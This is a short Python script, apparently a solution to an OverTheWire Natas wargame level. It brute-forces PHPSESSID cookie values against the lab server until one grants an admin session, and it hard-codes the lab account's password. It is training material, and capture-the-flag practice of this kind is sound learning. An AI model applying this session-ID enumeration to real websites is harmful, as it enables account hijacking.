#! /usr/bin/env python3.6
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#


"""
Natas 19 Solution
"""

import requests

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

for session_id in range(1, 641):
    response = session.get(url, cookies={"PHPSESSID": str(
        session_id)}, auth=(username, password))
    content = response.text
    if ("You are an admin" in content):
        print("Got it!", session_id)
        print(content)
        break
    else:
        print("trying", session_id)
